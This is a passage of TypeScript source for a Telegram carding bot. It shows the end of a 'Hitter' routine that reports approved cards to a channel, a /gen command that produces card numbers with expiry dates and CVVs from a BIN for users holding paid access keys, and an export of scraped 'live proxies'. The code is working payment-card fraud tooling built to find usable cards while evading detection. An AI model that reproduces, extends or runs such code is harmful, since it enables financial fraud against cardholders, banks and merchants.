*Latency:* ${latencyStr}
*Tried:* ${triedCount}/${count} cards
━━━━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" });

        notifyLiveCardToChannel(approvedCard, {
          status: "approved",
          response: approvedResult.response || "Hit Approved",
          latency: approvedResult.latency,
        }, "Hitter", telegramId);

      } else {
        bot?.sendMessage(chatId,
`❌ *No cards approved*
━━━━━━━━━━━━━━━━━━━━
*BIN:* \`${bin}\`
*Tried:* ${triedCount}/${count} cards
✅ ${approved} | ❌ ${declined} | ⚠️ ${errors}
*Amount:* ${amountStr} ${currency}
━━━━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" });
      }
    });

    // ─── /gen — Card Generator (redeemed users only) ──────────────────────────
    // Anchored regex — without ^\/gen\b the pattern matched /genkey too, so
    // sending /genkey 30 fired BOTH the redeem-code generator and this card
    // generator, dropping two replies on the user.
    bot.onText(/^\/gen(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("gen")) { bot?.sendMessage(chatId, "🚫 /gen is disabled by the owner."); return; }

      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) { bot?.sendMessage(chatId, "❌ Not registered. Send /start first."); return; }
      if (botUser.banned) { bot?.sendMessage(chatId, "🚫 Account banned."); return; }

      const freshSettings = await storage.getBotSettings();
      if (!(freshSettings as any).genEnabled) {
        bot?.sendMessage(chatId, "⛔ Card generation is currently disabled by admin.");
        return;
      }

      const hasAdminAccess = await checkAdmin(telegramId, botUser);
      if (!hasAdminAccess && !botUser.keyId) {
        bot?.sendMessage(chatId, "🔑 Redeem an access key first: `/redeem KEY`", { parse_mode: "Markdown" });
        return;
      }
      if (!hasAdminAccess && botUser.keyId) {
        const key = await storage.getAccessKeyById(botUser.keyId);
        if (key && key.expiresAt && new Date(key.expiresAt) < new Date()) {
          bot?.sendMessage(chatId, "⚠️ Your access key has expired. Redeem a new one: `/redeem KEY`", { parse_mode: "Markdown" });
          return;
        }
      }

      const input = match?.[1]?.trim() || "";
      if (!input) {
        bot?.sendMessage(chatId,
`🎲 *Card Generator Usage*
\`/gen BIN [count]\`

Examples:
\`/gen 424242 10\`
\`/gen 5555555555554444 5\`
\`/gen 4111 20\``, { parse_mode: "Markdown" });
        return;
      }

      const parts = input.split(/\s+/);
      const bin   = parts[0].replace(/\D/g, "");

      const maxGen   = (freshSettings as any).maxGenPerRequest ?? 10;
      const adminMax = Math.min(maxGen * 3, 100);
      const userMax  = maxGen;

      const requestedCount = parts[1] ? parseInt(parts[1], 10) : Math.min(10, userMax);
      const count = Math.min(
        isNaN(requestedCount) || requestedCount < 1 ? 10 : requestedCount,
        hasAdminAccess ? adminMax : userMax,
      );

      if (bin.length < 4) {
        bot?.sendMessage(chatId, "❌ BIN must be at least 4 digits.");
        return;
      }

      try {
        const cards = generateCards(bin, count);
        const lines = cards.map(c => `${c.number}|${c.expiryMonth}|${c.expiryYear}|${c.cvv}`);

        let msg = `🎲 *Generated ${count} Cards*\n`;
        msg += `*BIN:* \`${bin}xxx\` · *Type:* ${cards[0]?.type || "UNKNOWN"}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += lines.map(l => `\`${l}\``).join("\n");
        msg += `\n━━━━━━━━━━━━━━━━━━━━`;

        // Telegram message limit — send as file if too long
        if (msg.length > 4000) {
          const buffer = Buffer.from(lines.join("\n"), "utf-8");
          const ts = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
          await bot?.sendDocument(chatId, buffer, {
            caption: `🎲 *Generated ${count} cards from BIN ${bin}xxx*`,
            parse_mode: "Markdown",
          }, { filename: `gen_${bin}_${ts}.txt`, contentType: "text/plain" });
        } else {
          bot?.sendMessage(chatId, msg, { parse_mode: "Markdown" });
        }
      } catch (err: any) {
        bot?.sendMessage(chatId, `❌ Generation failed: ${err.message?.substring(0, 100)}`);
      }
    });

    // Error handlers were registered before startPolling above.
    await storage.updateBotSettings({ botRunning: true });
    return true;

  } catch (error: any) {
    await storage.createSystemLog({ level: "ERROR", message: `Failed to start bot: ${error.message}`, source: "telegram" });
    return false;
  }
}

export async function stopBot(): Promise<void> {
  if (bot) {
    try {
      await bot.stopPolling();
    } catch (e) {}
    bot = null;
    isPolling = false;
  }
  await storage.updateBotSettings({ botRunning: false });
  await storage.createSystemLog({ level: "INFO", message: "Telegram bot stopped", source: "telegram" });
}

export function isBotRunning(): boolean {
  return isPolling && bot !== null;
}

export async function sendProxyFile(content: string): Promise<boolean> {
  if (!bot || !isPolling) return false;

  try {
    const settings = await storage.getBotSettings();
    if (!settings.chatId) return false;

    const buffer = Buffer.from(content, "utf-8");
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);

    await bot.sendDocument(
      settings.chatId,
      buffer,
      {
        caption: `🔄 *Proxy Scrub Complete*\n📁 Live proxies exported\n⏰ ${new Date().toLocaleString()}`,
        parse_mode: "Markdown",
      },
      {
        filename: `live_proxies_${timestamp}.txt`,
        contentType: "text/plain",
      }
    );

    return true;
  } catch (error: any) {
    await storage.createSystemLog({
      level: "ERROR",
      message: `Failed to send proxy file: ${error.message}`,
      source: "telegram",
    });
    return false;
  }
}
